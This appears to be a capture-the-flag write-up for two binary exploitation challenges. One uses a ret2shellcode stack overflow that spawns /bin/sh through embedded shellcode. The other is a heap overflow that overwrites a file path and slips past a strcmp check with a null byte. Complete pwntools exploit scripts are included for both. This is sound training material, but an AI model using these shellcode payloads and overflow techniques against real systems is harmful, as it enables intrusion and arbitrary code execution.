## Note

Check for ASLR next time 

```
cat /proc/sys/kernel/randomize_va_space
```

## Pwn/MorseCode Encoder

### Initial Analysis

![image](https://github.com/user-attachments/assets/75fea0e5-d9df-44c0-a4ff-e240702dae63)

All of the security protections have been turned off (except ASLR of course).

![image](https://github.com/user-attachments/assets/630985d6-ce73-4b4a-b719-ad06f6062481)

When running the binary, we can see that it leaks out the address of our buffer, which is located in the stack memory region. The challenge is screaming ret2shellcode since we are given the address of the buffer and NX (No eXecute) protection is turned off. NX is a protection which prevents execution of shellcode in the stack. So, the basic idea is to inject shellcode into the buffer and overwrite the saved return address to point to our shellcode.

![image](https://github.com/user-attachments/assets/b1ceda87-4725-4f2f-8790-e51fc736bb5b)

However, when you overwrite the values which are popped into ecx, ebx and ebp, it will affect where the return goes to due to `lea esp, [ecx-0x4]`. So, we need to control the value of ecx since it will be moved into esp and control our return address.

![image](https://github.com/user-attachments/assets/0c379971-a400-413b-97bc-604b0818d413)

Just 12 bytes below our input, there is a pointer to our buffer. So, that will be our target. Now, we just need a shellcode. You can use msfvenom, shellcraft or find it online. I used shellcode from https://shell-storm.org/shellcode/files/shellcode-811.html

### Solve Script

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./morse-converter')
libc = exe.libc

host = "morsecode-encoder.ihack24.capturextheflag.io"
port = 1337

gdb_script = '''
b *main+141
c
'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
p = remote(host,port)
# p = gdb.debug('./morse-converter', gdbscript = gdb_script)

offset = 1024

sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

ru(b"address: ")
leak = int(r(10), 16)
tar = leak - 0x10

payload = sc.rjust(1024, b"\x90")
payload += p32(tar+8) * 10

sla(b"Enter]: ", payload)

p.interactive()
```

![image](https://github.com/user-attachments/assets/4856326e-f2e0-48ee-ae31-4c1bf492e4e5)

## Pwn/EtcPasswd Reader

### Initial Analysis

![image](https://github.com/user-attachments/assets/4f5cc698-593f-470a-96aa-8cf7132132a2)

Opening the binary in Ghidra, we can see that there is a buffer overflow with the gets() function inside the heap memory region due to the use of `malloc(0x40)`. Then, there is a second chunk allocated which contains the path `/etc/passwd`. So the goal is simple, bof enough until we reach the 2nd chunk and overwrite with the path to the flag. 

```
└─$ cat Dockerfile 
FROM ubuntu:22.04
ENV LC_CTYPE C.UTF-8
ENV DEBIAN_FRONTEND=noninteractive

<-- setup snippet -->

# flag location: /flag/secretflag/flag

CMD ["/start.sh"]

EXPOSE 9997
```

In the dockerfile, we can find the path to the flag. Before we go into exploitation, we need a little understanding about a [heap structure](https://sourceware.org/glibc/wiki/MallocInternals) first.

![image](https://github.com/user-attachments/assets/f4f8bc26-3782-4c63-8e3e-ce7cd50f149a)

The image above shows the structure of a heap chunk when we allocate it. The payload area is the location where we can store data. Above the payload, there is some metadata about the heap chunk. For example, the size of the chunk and also some flags (AMP) needed for internal functions. We can verify this by taking a look in gdb.

![image](https://github.com/user-attachments/assets/0c65f0a9-c44b-40ee-99ea-e92f6001e086)

We can see both of our chunks here. 0x51 is the size of the chunk because we malloc 0x40, another 0x10 comes from the header metadata, and 0x1 is the flag PREV_IN_USE. After the size, we have the user input `aaaaaaaa`. Below this chunk, we have the chunk for the file path `/etc/passwd`. Now we know, we need to write 0x50 bytes before we start overwriting the file path. There's one more thing left to do, which is to bypass the strcmp(). We can easily do that by sending `b"P$s5w0rd_53CurE_A8S8A9DF7239FSD0\x00"` followed by more user input. This is possible because gets() only stops taking user input after it receives `\n`, not `\x00`. This will bypass strcmp() as it only compares null terminated strings.

### Exploit Script

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./etcpasswd-reader')
libc = exe.libc

host = "etc-passwd-reader.ihack24.capturextheflag.io"
port = 1337

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

secret = b"P$s5w0rd_53CurE_A8S8A9DF7239FSD0\x00"

payload = secret
payload += b"A" * (80-len(secret))
payload += b"/flag/secretflag/flag"

sla(b"details: ", payload)

p.interactive()
```

![image](https://github.com/user-attachments/assets/13671dba-338d-4dc9-ae19-ceba88593c7b)
